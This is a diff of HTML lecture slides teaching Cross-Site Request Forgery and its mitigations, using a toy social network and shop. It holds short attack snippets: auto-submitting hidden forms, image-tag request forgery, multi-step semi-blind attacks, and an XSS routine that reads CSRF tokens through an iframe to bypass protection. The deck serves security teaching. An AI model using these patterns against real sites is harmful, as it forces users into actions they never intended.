@@ -27,6 +27,10 @@
     </hgroup>
   </slide>
 
+  <slide class="fill nobackground" style="background-image: url(images/ideasmall.png);background-position:0px -50px;">
+	  <footer class="source white">https://www.flickr.com/photos/fai9a3/3785107901</footer>
+  </slide>
+
   <slide>
     <hgroup>
       <h2>http://social-network.de/</h2>
@@ -45,31 +49,6 @@
   &lt;input type="text" name="pw" /&gt;
   &lt;input type="submit" value="Login!" /&gt;
 &lt;/form&gt;
-</pre>
-    </article>
-  </slide>
-
-  <slide>
-    <hgroup>
-      <h2>http://social-network.de/</h2>
-    </hgroup>
-    <article>
-<pre class="prettyprint">
-POST / HTTP/1.1
-Host: social-network.de
-
-user=santa&pw=claus
-</pre>
-
-<pre class="prettyprint">
-HTTP/1.1 200 OK
-Set-Cookie: sessionid=a212jhu2145912;
-            expires=Tue, 29-Mar-2014 19:30:42 GMT;
-            Max-Age=2592000;
-            Path=/
-
-<html>
-…
 </pre>
     </article>
   </slide>
@@ -105,18 +84,66 @@ Set-Cookie: sessionid=a212jhu2145912;
 
   <slide>
     <hgroup>
-      <h2>HTTP</h2>
-      <h3>Stateless: each request contains all information necessary to
-      process it.</h3>
+      <h2>http://social-network.de/new?text=huhu</h2>
     </hgroup>
     <article>
 <pre class="prettyprint" data-lang="HTML">
+&lt;h1>My Social Network!&lt;/h1&gt;
+&lt;strong&gt;Logged in as: santa&lt;/strong&gt;
+&lt;h2&gt;Whiteboard entry 'huhu' created!&lt;/h2&gt;
+
+&lt;h2&gt;My Whiteboard&lt;/h2&gt;
+&lt;ul&gt;
+  <b style="background-color:lightblue">&lt;li&gt;huhu&lt;/li&gt;</b>
+  &lt;li&gt;Took a walk.&lt;/li&gt;
+  &lt;li&gt;First Entry! Hello World :).&lt;/li&gt;
+&lt;/ul&gt;
+</pre>
+    </article>
+  </slide>
+
+  <slide>
+    <hgroup>
+      <h2>http://social-network.de/</h2>
+    </hgroup>
+    <article>
+<pre class="prettyprint">
+POST / HTTP/1.1
+Host: social-network.de
+
+user=santa&pw=claus
+</pre>
+
+<pre class="prettyprint">
+HTTP/1.1 200 OK
+Set-Cookie: sessionid=a212jhu2145912;
+            expires=Tue, 29-Mar-2014 19:30:42 GMT;
+            Max-Age=2592000;
+            Path=/
+
+<html>
+…
+</pre>
+    </article>
+  </slide>
+
+
+  <slide>
+    <hgroup>
+      <h2>HTTP</h2>
+      <!--
+      <h3>Stateless: each request contains all information necessary to
+      process it.</h3>
+      -->
+    </hgroup>
+    <article>
+<pre class="prettyprint">
 GET /new?entry=huhu HTTP/1.1
 Host: social-network.de
 Cookie: sessionid=a212jhu2145912;
 </pre>
 
-<pre class="prettyprint" data-lang="HTML">
+<pre class="prettyprint">
 HTTP/1.1 200 OK
 
 …
@@ -125,10 +152,7 @@ HTTP/1.1 200 OK
 
 &lt;ul&gt;
   &lt;li&gt;huhu&lt;/li&gt;
-  &lt;li&gt;Took a walk.&lt;/li&gt;
-  &lt;li&gt;First Entry! Hello World :).&lt;/li&gt;
-&lt;/ul&gt;
-…
+&hellip;
 </pre>
     </article>
   </slide>
@@ -147,7 +171,6 @@ HTTP/1.1 200 OK
 <pre class="prettyprint" data-lang="HTML">
 &lt;h1&gt;Cat GIFs Forum!&lt;/h1&gt;
 
-
 &lt;div class="post"&gt;
   Look at my funny gif!
   &lt;img src="http://funny.com/cat.gif" /&gt;
@@ -156,53 +179,52 @@ HTTP/1.1 200 OK
 &lt;div class="post"&gt;
   Look at my funny gif!
   &lt;img 
-    src="http://social-network.de/?entry=buy%20cheap%20pharmacy%20at%20www.medicals.org"/&gt;
+    src="http://social-network.de/new?entry=buy%pharmacy%20at%20www.medicals.com"/&gt;
 &lt;/div&gt;
 </pre>
     </article>
   </slide>
 
   <slide>
-    <article>
-<pre class="prettyprint" data-lang="HTML">
+    <article class="build">
+    <div>
+<pre class="prettyprint">
 GET / HTTP/1.1
 Host: cat-gifs-forum.com
----------------------
-HTTP/1.1 200 OK
-
-&lt;h1&gt;Cat GIFs Forum!&lt;/h1&gt;
 </pre>
+</div>
 
-<pre class="prettyprint" data-lang="HTML">
+<div>
+<pre class="prettyprint">
 GET /cat.gif HTTP/1.1
-Host: funny.com
----------------------
-HTTP/1.1 200 OK
-…
+Host: cat-gifs-forum.com
 </pre>
+</div>
 
-<pre class="prettyprint" data-lang="HTML">
-GET /new?entry=buy%20cheap%20pharmacy%20at%20www.medicals.org HTTP/1.1
+<div>
+<pre class="prettyprint">
+GET /new?entry=buy%20pharmacy%20at%20www.medicals.com HTTP/1.1
 Host: social-network.de
 Cookie: sessionid=a212jhu2145912;
----------------------
+
 HTTP/1.1 200 OK
 
 &lt;strong&gt;Logged in as: santa&lt;/strong&gt;
-&lt;h2&gt;Whiteboard entry 'buy cheap pharmacy…' created!&lt;/h2&gt;
+&lt;h2&gt;Whiteboard entry 'buy pharmacy…' created!&lt;/h2&gt;
 …
 </pre>
+</div>
     </article>
   </slide>
 
-  <slide class="">
+  <slide class="hidden">
     <article class="flexbox vcenter">
       <h2 style="font-size:2em"><span class="uni-red"><code>POST</code> instead of <code>GET</code>?</span></h2>
     </article>
   </slide>
 
 
-  <slide>
+  <slide class="hidden">
     <hgroup>
       <h2>http://social-network.de/</h2>
       <!--
@@ -212,7 +234,7 @@ HTTP/1.1 200 OK
       -->
     </hgroup>
     <article>
-<pre class="prettyprint" data-lang="HTML">
+    <!--
 &lt;h1>My Social Network!&lt;/h1&gt;
 &lt;strong&gt;Logged in as: santa&lt;/strong&gt;
 
@@ -221,7 +243,9 @@ HTTP/1.1 200 OK
   &lt;li&gt;Took a walk.&lt;/li&gt;
   &lt;li&gt;First Entry! Hello World :).&lt;/li&gt;
 &lt;/ul&gt;
+-->
 
+<pre class="prettyprint" data-lang="HTML">
 &lt;h2&gt;New Entry&lt;/h2&gt;
 &lt;form method="POST" action="/new"&gt;
   &lt;input type="text" name="entry" /&gt;
@@ -255,6 +279,156 @@ HTTP/1.1 200 OK
     </article>
   </slide>
 
+  <slide class="">
+    <article class="flexbox vcenter">
+      <h2 style="font-size:2em"><span class="uni-red">Cross-Site Request Forgery</span></h2>
+      <h3>aka: CSRF &mdash; XSRF &mdash; Sea Surf</h3>
+    </article>
+  </slide>
+
+  <slide class="">
+    <article>
+    <br/>
+    <center>
+      <table style="width:auto !important;">
+        <tr>
+          <th style="text-align:center;">
+	    OWASP Top 10 &mdash; 2013
+	  </th>
+        </tr>
+	<tr><td style="padding:0.7em 0.5em !important;">A1-Injection</tr></td>
+	<tr><td style="padding:0.7em 0.5em !important;">A2-Broken Authentication and Session Management</tr></td>
+	<tr><td style="padding:0.7em 0.5em !important;">A3-Cross-Site Scripting (XSS)</tr></td>
+	<tr><td style="padding:0.7em 0.5em !important;">A4-Insecure Direct Object References</tr></td>
+	<tr><td style="padding:0.7em 0.5em !important;">A5-Security Misconfiguration</tr></td>
+	<tr><td style="padding:0.7em 0.5em !important;">A6-Sensitive Data Exposure</tr></td>
+	<tr><td style="padding:0.7em 0.5em !important;">A7-Missing Function Level</tr></td>
+	<tr><td style="padding:0.7em 0.5em !important;" class="highlight">A8-Cross-Site Request Forgery</tr></td>
+	<tr><td style="padding:0.7em 0.5em !important;">A9-Using Components with Known Vulnerabilities</tr></td>
+	<tr><td style="padding:0.7em 0.5em !important;">A10-Unvalidated</tr></td>
+	</table>
+    </center>
+    </article>
+  </slide>
+
+  <slide class="quote" style="color:#797979;">
+    <article class="flexbox vleft">
+      <q>
+      <!--
+      Cross-site Request Forgery is a vulnerability in a website that
+      allows attackers to force victims to perform security-sensitive
+      actions on the Internet without their knowledge.
+      (without their knowledge)
+      in which he/she is currently
+      authenticated. 
+      -->
+
+      Cross-Site Request Forgery is an attack which forces victims
+      to perform sensitive actions on a web application without their 
+      knowledge.
+
+      </q>
+      <div class="author" style="bottom:140px; right: 60px;">
+      
+      </div>
+    </article>
+  </slide>
+
+  <slide class="quote" style="color:#797979;">
+    <article class="flexbox vleft">
+      <q>
+      Cross-Site Request Forgery is an attack <em>which forces</em> victims
+      to perform <em>sensitive actions</em> on a web application 
+      <em>without their knowledge</em>.
+      </q>
+      <div class="author" style="bottom:140px; right: 60px;">
+      
+      </div>
+    </article>
+  </slide>
+
+  <slide>
+    <hgroup>
+      <h2>Sensitive Actions?</h2>
+    </hgroup>
+    <article class="flexbox vcenter">
+	<p>/shop/order.php?item=1</p>
+	<p>/bank/create-admin.php</p>
+	<p>/accounts/edit-user.py</p>
+	<p>/webmail/SendMail.aspx</php>
+	<p>/cms/edit.jsp</php>
+    </article>
+  </slide>
+
+  <slide>
+    <hgroup>
+      <h2>Ideas for Mitigation?</h2>
+    </hgroup>
+    <article>
+      <div class="columns-2">
+	<ul>
+          <li class="nodisc uni-red"><h3>Only allow POST?</h3></li>
+        </ul>
+	<ul>
+          <li class="nodisc uni-red"><h3>&nbsp;</h3></li>
+        </ul>
+      </div>
+    </article>
+  </slide>
+
+
+  <slide>
+    <hgroup>
+      <h2>http://social-network.de/</h2>
+      <!--
+      <h3>Stateless: each request contains all information necessary to
+      process it.</h3>
+	User is logged in
+      -->
+    </hgroup>
+    <article>
+    <!--
+&lt;h1>My Social Network!&lt;/h1&gt;
+&lt;strong&gt;Logged in as: santa&lt;/strong&gt;
+
+&lt;h2&gt;My Whiteboard&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Took a walk.&lt;/li&gt;
+  &lt;li&gt;First Entry! Hello World :).&lt;/li&gt;
+&lt;/ul&gt;
+-->
+
+<pre class="prettyprint" data-lang="HTML">
+&lt;h2&gt;New Entry&lt;/h2&gt;
+&lt;form method="POST" action="/new"&gt;
+  &lt;input type="text" name="entry" /&gt;
+  &lt;input type="submit" value="Submit!" /&gt;
+&lt;/form&gt;
+</pre>
+    </article>
+  </slide>
+
+  <slide>
+    <hgroup>
+      <h2>CSRF POST Request</h2>
+      <!--
+      our image exploit no longer works, this however does
+      -->
+    </hgroup>
+    <article>
+<pre class="prettyprint" data-lang="HTML">
+&lt;form method="POST" action="http://social-network.de/new" name="frmCSRF"&gt;
+  &lt;input type="text" name="entry" value="huhu!" /&gt;
+&lt;/form&gt;
+
+&lt;script type="text/javascript"&gt;
+document.body.onload = function() {
+	document.frmCSRF.submit();
+}
+&lt;/script&gt;
+</pre>
+    </article>
+  </slide>
   <slide>
     <hgroup>
       <h2>http://cat-gifs-forum.com/</h2>
@@ -273,7 +447,7 @@ HTTP/1.1 200 OK
   Look at my funny gif!
   &lt;img src="<b style="background-color:lightblue">http://somesite/cat.gif"/&gt;
   &lt;form name="frmCSRF" method="POST" action="http://social-network.de/new/"&gt;
-    &lt;input type="hidden" name="entry" value="buy cheap pharmacy at www.medicals.org"/&gt;
+    &lt;input type="hidden" name="entry" value="buy pharmacy at www.medicals.com"/&gt;
   &lt;/form&gt;
   &lt;script&gt;document.frmCSRF.submit(); &lt;/script&gt;&lt;br</b>/&gt;
 &lt;/div&gt;
@@ -281,7 +455,7 @@ HTTP/1.1 200 OK
     </article>
   </slide>
 
-  <slide>
+  <slide class="hidden">
     <article>
 <pre class="prettyprint" data-lang="HTML">
 GET / HTTP/1.1
@@ -305,115 +479,363 @@ POST /
 Host: social-network.de
 Cookie: sessionid=a212jhu2145912;
 
-entry=buy%20cheap%20pharmacy%20at%20www.medicals.org
+entry=buy%20pharmacy%20at%20www.medicals.com
 ---------------------
 HTTP/1.1 200 OK
 
 &lt;strong&gt;Logged in as: santa&lt;/strong&gt;
-&lt;h2&gt;Whiteboard entry 'buy cheap pharmacy…' created!&lt;/h2&gt;
+&lt;h2&gt;Whiteboard entry 'buy pharmacy…' created!&lt;/h2&gt;
 …
 </pre>
     </article>
   </slide>
 
-  <slide class="">
-    <article class="flexbox vcenter">
-      <h2 style="font-size:2em"><span class="uni-red">What is the problem?</span></h2>
+
+
+  <slide>
+    <hgroup>
+      <h2>What about other HTTP verbs?</h2>
+<h3> GET, POST, PUT, DELETE, HEAD, OPTIONS, TRACE, &hellip; </h3>
+    </hgroup>
+    <article>
+    <div class="build">
+    <div>
+<pre class="prettyprint">
+jQuery.ajax({
+	type: "PUT",
+	url: "/social-network.de/new",
+	contentType: "plain/text",
+	data: "entry=yippie"
+});
+</pre>
+    </div>
+</div>
     </article>
   </slide>
 
   <slide>
     <hgroup>
-      <h2>http://cat-gifs-forum.com/</h2>
+      <h2>Ideas for Mitigation?</h2>
     </hgroup>
     <article>
-<pre class="prettyprint" data-lang="HTML">
-&lt;h1&gt;Cat GIFs Forum!&lt;/h1&gt;
-
-
-&lt;div class="post"&gt;
-  Look at my funny gif!
-  &lt;img src="http://funny.com/cat.gif" /&gt;
-&lt;/div&gt;
-
-&lt;div class="post"&gt;
-  Look at my funny gif!
-  &lt;img 
-    src="http://social-network.de/?entry=buy%20cheap%20pharmacy%20at%20www.medicals.org"/&gt;
-&lt;/div&gt;
-</pre>
-    </article>
-  </slide>
-
-  <slide>
-    <article>
-<pre class="prettyprint" data-lang="HTML">
-GET / HTTP/1.1
-Host: cat-gifs-forum.com
----------------------
-HTTP/1.1 200 OK
-
-&lt;h1&gt;Cat GIFs Forum!&lt;/h1&gt;
-</pre>
-
-<pre class="prettyprint" data-lang="HTML">
-GET /cat.gif HTTP/1.1
-Host: funny.com
----------------------
-HTTP/1.1 200 OK
-…
-</pre>
-
-<pre class="prettyprint" data-lang="HTML">
-GET /new?entry=buy%20cheap%20pharmacy%20at%20www.medicals.org HTTP/1.1
-Host: social-network.de
-Cookie: sessionid=a212jhu2145912;
----------------------
-HTTP/1.1 200 OK
-
-&lt;strong&gt;Logged in as: santa&lt;/strong&gt;
-&lt;h2&gt;Whiteboard entry 'buy cheap pharmacy…' created!&lt;/h2&gt;
-…
-</pre>
-    </article>
-  </slide>
-
-  <slide class="">
-    <article class="flexbox vcenter">
-      <h2 style="font-size:2em"><span class="uni-red"><code>POST</code> instead of <code>GET</code>?</span></h2>
+      <div class="columns-2">
+	<ul>
+          <li class="nodisc uni-red"><h3><span class="strikeout">&nbsp;Only allow POST?&nbsp;</span></h3></li>
+        </ul>
+	<ul>
+          <li class="nodisc uni-red"><h3>&nbsp;</h3></li>
+        </ul>
+      </div>
     </article>
   </slide>
 
   <slide>
     <hgroup>
-      <h2>http://social-network.de/</h2>
-      <!--
-      <h3>Stateless: each request contains all information necessary to
-      process it.</h3>
-	User is logged in
-      -->
+      <h2>Ideas for Mitigation?</h2>
     </hgroup>
     <article>
+      <div class="columns-2">
+	<ul>
+          <li class="nodisc uni-red"><h3><span class="strikeout">&nbsp;Only allow POST?&nbsp;</span></h3></li>
+        </ul>
+	<ul>
+          <li class="nodisc uni-red"><h3>&nbsp;Referrer Checking?&nbsp;</h3></li>
+        </ul>
+      </div>
+    </article>
+  </slide>
+
+  <slide>
+    <hgroup>
+      <h2>Referrer checking?</h2>
+    </hgroup>
+    <article>
+    <div class="">
+    <div>
+<pre class="prettyprint">
+Referrer: http://social-network.de/settings/privacy
+</pre>
+    </div>
+</div>
+    </article>
+  </slide>
+
+  <slide>
+    <article class="flexbox vcenter">
+	<h2>Referrer vs. Origin</h2>
+    </article>
+  </slide>
+
+  <slide class="quote" style="color:#797979;">
+    <article class="">
+      <q>
+       The Origin header includes only the information required to identify
+       the principal that initiated the request (typically the scheme,
+       host, and port of initiating origin). 
+      </q>
+      <br/>
+      <br/>
+      <q>
+       [&hellip;] the Origin header does not contain the path or query portions 
+       of the URI included in the Referer header [&hellip;].
+      </q>
+
+      <div class="author" style="bottom:70px; right: 60px;">
+     http://tools.ietf.org/id/draft-abarth-origin-03.html 
+      </div>
+    </article>
+  </slide>
+
+  <slide>
+    <hgroup>
+      <h2>Ideas for Mitigation?</h2>
+    </hgroup>
+    <article>
+      <div class="columns-2">
+	<ul>
+          <li class="nodisc uni-red"><h3><span class="strikeout">&nbsp;Only allow POST?&nbsp;</span></h3></li>
+        </ul>
+	<ul>
+          <li class="nodisc uni-red"><h3><span class="strikeout">&nbsp;Referrer Checking?&nbsp;</span></h3></li>
+        </ul>
+      </div>
+    </article>
+  </slide>
+
+  <slide>
+    <hgroup>
+      <h2>Ideas for Mitigation?</h2>
+    </hgroup>
+    <article>
+      <div class="columns-2">
+	<ul>
+          <li class="nodisc uni-red"><h3><span class="strikeout">&nbsp;Only allow POST?&nbsp;</span></h3></li>
+          <li class="nodisc uni-red"><h3>&nbsp;Multi-Step Forms</h3></li>
+        </ul>
+	<ul>
+          <li class="nodisc uni-red"><h3><span class="strikeout">&nbsp;Referrer Checking?&nbsp;</span></h3></li>
+        </ul>
+      </div>
+    </article>
+  </slide>
+
+  <slide>
+    <hgroup>
+      <h2>Ideas for Mitigation: Multi-Step Forms</h2>
+    </hgroup>
+    <article class="flexbox vcenter">
+    <center>
+	<img src="images/multi-step.svg" width="800" />
+    </center>
+    <br/>&nbsp;<br/>
+    </article>
+  </slide>
+
+  <slide class="hidden fill nobackground" style="background-image: url(images/blind.jpg);background-position:0px -50px;">
+	<hgroup>
+		<h2>Blind</h2>
+	</hgroup>
+	  <footer class="source white">https://www.flickr.com/photos/ivanavasilj/5217412187</footer>
+  </slide>
+
+  <slide class="hidden fill nobackground" style="background-image: url(images/peek.jpg);background-position:0px -50px;">
+	<hgroup>
+		<h2 style="color:white;">Semi-Blind</h2>
+	</hgroup>
+	  <footer class="source white">https://www.flickr.com/photos/sybrenstuvel/4095627798</footer>
+  </slide>
+
+  <slide>
+    <hgroup>
+	<h2></h2>
+    </hgroup>
+    <article class="flexbox">
+	<br/>
+
+	<div class="columns-2 build">
+		<div style="text-align:left;margin-right:-40px;">
+			<h3><strong class="uni-red">Until now:</strong> Blind attacks.</h3>
+			<br/>&nbsp;<br/>
+			<img src="images/blind.svg" height="250" />
+		</div>
+		<div style="text-align:left;margin-left:-80px;">
+			<h3><strong class="uni-red">Now:</strong> Semi-Blind attacks.</h3>
+			<br/>&nbsp;<br/>
+			<img src="images/semiblind2.svg" height="250" />
+			<img src="images/semiblind.svg" height="250" />
+		</div>
+	</div>
+    </article>
+  </slide>
+
+  <slide>
+    <hgroup>
+      <h2>Semi-Blind attacks</h2>
+    </hgroup>
+    <article>
+
 <pre class="prettyprint" data-lang="HTML">
-&lt;h1>My Social Network!&lt;/h1&gt;
-&lt;strong&gt;Logged in as: santa&lt;/strong&gt;
+&lt;img src="http://shop/customer-profile/profile.png" 
+     onload="logged_in(true);" 
+     onerror="logged_in(false);" 
+/&gt;
+</pre>
 
-&lt;h2&gt;My Whiteboard&lt;/h2&gt;
-&lt;ul&gt;
-  &lt;li&gt;Took a walk.&lt;/li&gt;
-  &lt;li&gt;First Entry! Hello World :).&lt;/li&gt;
-&lt;/ul&gt;
+</div>
+    </article>
+  </slide>
 
-&lt;h2&gt;New Entry&lt;/h2&gt;
-&lt;form method="POST" action="/new"&gt;
-  &lt;input type="text" name="entry" /&gt;
-  &lt;input type="submit" value="Submit!" /&gt;
+
+  <slide>
+    <hgroup>
+	    <h2>Multi-step, Semi-Blind attacks</h2>
+    </hgroup>
+    <article>
+    <div class="build">
+
+<div>
+<pre class="prettyprint" data-lang="HTML">
+&lt;img src="http://shop/add-to-cart/453" onerror="step(2)" /&gt;
+</pre>
+</div>
+
+    <div>
+<pre class="prettyprint" data-lang="HTML">
+&lt;iframe name="step1" onload="step(2);"&gt;&lt;/iframe&gt;
+&lt;form method="POST" action="http://shop/add-to-cart" target="step1" name="frmStep1"&gt;
+	&lt;input type="text" name="item" value="943" /&gt;
 &lt;/form&gt;
+&lt;script&gt;document.getElementById("frmStep1").submit()&lt;/script&gt;
 </pre>
+</div>
+
+<div>
+<pre class="prettyprint" data-lang="HTML">
+&lt;iframe name="step2" onload="step(3);"&gt;&lt;/iframe&gt;
+&lt;form method="POST" action="http://shop/shipping-address" target="step2" name="frmStep2"&gt;
+&hellip;
+</pre>
+</div>
+
+</div>
     </article>
   </slide>
 
-  <slide class="">
+
+  <slide>
+    <hgroup>
+      <h2>Ideas for Mitigation?</h2>
+    </hgroup>
+    <article>
+      <div class="columns-2">
+	<ul>
+          <li class="nodisc uni-red"><h3><span class="strikeout">&nbsp;Only allow POST?&nbsp;</span></h3></li>
+          <li class="nodisc uni-red"><h3><span class="strikeout">&nbsp;Multi-Step Forms</span></h3></li>
+        </ul>
+	<ul>
+          <li class="nodisc uni-red"><h3><span class="strikeout">&nbsp;Referrer Checking?&nbsp;</span></h3></li>
+        </ul>
+      </div>
+    </article>
+  </slide>
+
+  <slide>
+  <aside class="note">
+			&ldquo;Cross-Domain-Policy&rdquo;
+	</aside>
+    <hgroup>
+	<h2>hmm&hellip; let's recap for a second</h2>
+    </hgroup>
+    <article class="flexbox">
+	<br/>
+
+	<div class="columns-2 build">
+		<div style="text-align:center;margin-right:40px;">
+			<h3><strong class="uni-red">What we can:</strong> send requests.</h3>
+			<br/>&nbsp;<br/>
+			<img src="images/write.svg" width="350" />
+		</div>
+
+		<div style="text-align:center;">
+			<h3><strong class="uni-red">What we can't:</strong> read reply payload.</h3>
+			<br/>&nbsp;<br/>
+			<img src="images/read.svg" width="350" />
+		</div>
+	</div>
+    </article>
+  </slide>
+
+  <slide>
+    <hgroup>
+	<h2>Challenge-Response-Tests</h2>
+    </hgroup>
+    <article class="flexbox vcenter">
+
+	<img src="images/captcha.svg" width="500" />
+
+<!--
+	<img src="images/recaptcha.png" width="412" />
+	Captcha
+	Authentication prompts
+
+	not ideal for all siturations: you e.g. don't want to enter a captcha 
+	for every action in your social network
+	-->
+    </article>
+  </slide>
+
+  <slide class="fill nobackground" style="background-image: url(images/recaptcha-hell.png);background-position:0px -10px;">
+  <!--
+	not ideal for all siturations: you e.g. don't want to enter a captcha 
+	for every action in your social network
+	-->
+  </slide>
+
+  <slide>
+    <article class="flexbox vcenter">
+    <!--
+	<h2 class="hidden">Better: Tokens</h2>
+	-->
+	    <h2 class="uni-red">unique requests<br/>which cannot easily be generated by attackers</h2>
+    </article>
+  </slide>
+
+  <slide>
+    <hgroup>
+	<h2>Synchronizer Token Pattern</h2>
+  <h3>Generate random value, associate it with user's session.</h3>
+    </hgroup>
+    <article class="build">
+
+<div>
+<pre class="prettyprint">
+$token = randomValue();
+db_save('csrf_token', $session_id, $token);
+</pre>
+</div>
+
+<div>
+<pre class="prettyprint" data-lang="HTML">
+&lt;form &hellip;&gt;
+  &lt;input type="hidden" value="&lt;?= $token; ?&gt;" /&gt; 
+  &lt;input type="text" name="shipping_address" value="" /&gt;
+</pre>
+</div>
+
+<div>
+<pre class="prettyprint" data-lang="PHP">
+if ($_POST['token'] === db_get('csrf_token', $session_id)):
+  // execute request
+  &hellip;
+else:
+  // possible csrf attack
+endif;
+</pre>
+</div>
+    </article>
+  </slide>
+
+  <slide class="hidden">
       <hgroup>
 	      <h2><span class="uni-red">Anti measures?</span></h2>
 	      <h3><em>Synchronizer Token Pattern</em></h3>
@@ -440,60 +862,402 @@ HTTP/1.1 200 OK
     </article>
   </slide>
 
-  <!--
-	evtl. slide dazu, dass manche applikationen das verballern, weil 
-	sie den token in der url uebertrage (leaking via e.g. browser history)
-  -->
+
+
+<!--
+ STATE ON CLIENT
+  bild: server mit 
+$token = hash(salt + username + hash_of_password_of_user)
+
+	<form ... >
+	 input value = $token;
+	 submit
+
+	server mit if ($_POST['token'] === hash(salt + usern ...)
+-->
+
+
+  <slide class="fill nobackground" style="background-image: url(images/the-end.png)">
+  </slide>
 
   <slide class="">
+  <!--
+-->
+      <hgroup>
+	      <h2><span class="uni-red">
+Implementation weaknesses:
+Predictable token
+	      </span></h2>
+      </hgroup>
+    <article>
+<div class="build">
+<div>
+<pre class="prettyprint" data-lang="PHP">
+$token = md5($username);
+$token = md5($today);
+</pre>
+</div>
+
+<div>
+<br/>&nbsp;
+<p>Better: 
+
+<ul><li>&ldquo;real&rdquo; random values</li>
+<li>Varying input name as well</li>
+<li>
+<pre class="prettyprint" data-lang="HTML">
+&lt;input type="hidden" name="token_342" value="&hellip" /&gt;
+</pre></li>
+</ul>
+</div>
+</div>
+
+    </article>
+  </slide>
+
+  <slide class="">
+      <hgroup>
+	      <h2><span class="uni-red">
+Implementation weaknesses: <br/>Disclosure of token in URI
+	      </span></h2>
+      </hgroup>
+    <article class="build">
+    <div>
+
+<pre class="prettyprint">
+// Browser history!
+Visited Sites: 
+http://bank.com/?token=123
+</pre>
+    </div>
+
+<div>
+<pre class="prettyprint">
+// Logs on the way!
+127.0.0.1 - - [02/Jun/2014:22:25:09 +0200] "POST /bank/api.php?token=42 HTTP/1.1" &hellip;
+</pre>
+</div>
+
+<div>
+<pre class="prettyprint">
+Referrer: http://bank.com/?token=1337
+</pre>
+</div>
+
+<div>
+<p>Enables replay attacks!</p>
+<p>Better: <ul>
+<li>Cookie, POST</li>
+<li>Per-Session Token &#8594; Per-Request Token</li>
+</ul>
+
+</p>
+    </div>
+    </article>
+  </slide>
+
+  <slide class="">
+      <hgroup>
+	      <h2><span class="uni-red">
+Per-Session Token &#8594; Per-Request Token
+	      </h2>
+	      <h3>Double Submit Cookie</h3>
+      </hgroup>
+    <article class="build">
+    <!--
+    	<ul>
+		<li>Server generates random token and saves it in cookie</li>
+		<li>When creating form random token value is used in hidden input</li>
+		<li>Server checks if submitted hidden input === value in cookie</li>
+		<li>Serverside: Stateless</li>
+	</ul>
+	-->
+
+<div>
+<pre class="prettyprint">
+$token = randomValue();
+
+Set-Cookie: $token
+
+&lt;form method="POST" &hellip;&gt;
+  &lt;input name="token" value="$token" />
+</pre>
+</div>
+<div>
+<pre class="prettyprint">
+if ($COOKIE_TOKEN == $POST_TOKEN)
+  // valid
+else
+  // possible csrf
+</pre>
+</div>
+
+
+    </article>
+  </slide>
+
+  <slide class="">
+      <hgroup>
+	      <h2><span class="uni-red">
+Weaknesses of pattern implementations
+	      </span></h2>
+<h3>Disclosure of per-session token via e.g. wifi</h3>
+      </hgroup>
+    <article>
+<pre class="prettyprint">
+Cookie: &hellip;
+</pre>
+
+<div>
+Better: per-request token or HTTPS
+</div>
+    </article>
+  </slide>
+<!--
+
+no state on server
+  double-submit cookies
+
+sending a random value in both a cookie and as a request parameter, with the
+server verifying if the cookie value and request value are equal. 
+-->
+  <slide class="hidden">
       <hgroup>
 	      <h2><span class="uni-red">(Sessionless) Anti measures?</span></h2>
 	      <h3><em>Double Submit Cookies</em></h3>
       </hgroup>
     <article class="flexbox vcenter">
+    </article>
+  </slide>
+
+  <slide class="fill nobackground" style="background-image: url(images/the-end.png)">
+  </slide>
+
+  <slide>
+  <hgroup>
+	<h2>Same-Origin-Policy</h2>
+  </hgroup>
+    <article class="">
+
+<pre class="prettyprint">
+&lt;h1&gt;Site A&lt;/h1&gt;
+
+&lt;iframe src="http://site-B/" id="iframe"&gt;
+  &lt;form &hellip;&gt;
+    &lt;input type="hidden" name="csrf_token" value="1337" /&gt;
+&lt;/iframe&gt;
+
+&lt;script&gt;
+  // This is *not* possible:
+  var token = 
+    document.getElementById("iframe").contentDocument.forms[0].csrf_token.value;
+&lt;/script&gt;
+</pre>
+    </article>
+  </slide>
+
+  <slide class="">
+    <article class="flexbox vcenter">
+      <h2 style="font-size:2em"><span class="uni-red">XSS &mdash; the best friend of CSRF</span></h2>
+    </article>
+  </slide>
+
+  <slide class="">
+  <hgroup>
+  <h2>XSS Recap</h2>
+  </hgroup>
+    <article>
+<pre class="prettyprint">
+&lt;h2&gt;Visitor Comments:&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    Peter: Love the site!
+  &lt;/li&gt;
+  &lt;li&gt;
+    John: &lt;script type="text/javascript"&gt;alert("Yippie!")&lt;/script&gt;
+  &lt;/li&gt;
+  &hellip;
+&lt;/ul&gt;
+</pre>
+
+    </article>
+  </slide>
+
+  <slide class="">
+  <hgroup>
+  <h2>Bypassing CSRF Protection</h2>
+  </hgroup>
+    <article class="build">
+<div>
+<pre class="prettyprint" data-lang="JavaScript">
+document.cookie
+//JSESSIONID=8123ANJNASDF21
+</pre>
+</div>
+
+<div>
+<pre class="prettyprint" data-lang="JavaScript">
+document.writeln('&lt;iframe id="iframe" 
+  src="/admin/users.php?action=add_admin" onload="read()"&gt;&lt;/iframe&gt;');
+
+var token = document.getElementById("iframe").contentDocument.forms[0].csrf_token.value;
+document.writeln('&lt;form&gt; &ltinput name="token" value="' + token &hellip;);
+</pre>
+</div>
+
+<div>
+<pre class="prettyprint" data-lang="JavaScript">
+
+$("#iframe").contents().find("shipping_address").attr("value", "to me :)"); 
+$("#iframe").contents().find("form").submit();
+</pre>
+</div>
+    </article>
+  </slide>
+
+
+  <slide class="fill nobackground" style="background-image: url(images/bear.jpg)">
+    <hgroup>
+      <h2 class="white">Into the Wild</h2>
+      </hgroup>
+    <footer class="source white">
+    https://www.flickr.com/photos/25949441@N02/9501502998
+    </footer>
+  </slide>
+
+  <slide class="">
+    <article class="flexbox vcenter">
+    <!--
     	<ul>
-		<li>Server generates random token and saves it in cookie</li>
-		<li>When creating form random token value is used in hidden input</li>
-		<li>Server checks if submitted hidden input === value in cookie</li>
+		<li>&gt; 1 Mio users infected after 20 hours</li>
+		<li>Payload: profile post + friend request</li>
+	</ul>
+	-->
+	      <h2><span class="uni-red">&ldquo;but most of all, samy is my hero&rdquo;</span></h2>
+    </article>
+  </slide>
+
+  <slide class="">
+    <article class="flexbox vcenter">
+	      <h2><span class="uni-red">GMAIL Filter CSRF</span></h2>
+    </article>
+  </slide>
+
+  <slide class="">
+      <hgroup>
+	      <h2><span class="uni-red">Pollute Browser History</span></h2>
+      </hgroup>
+    <article class="">
+    <div class="build">
+<div>
+<pre class="prettyprint" >
+https://wikileaks.org/readme-before-leaking
+https://wikileaks.org/submission
+https://wikileaks.org/submission-successful
+</pre>
+</div>
+	
+    <div>
+<pre class="prettyprint" >
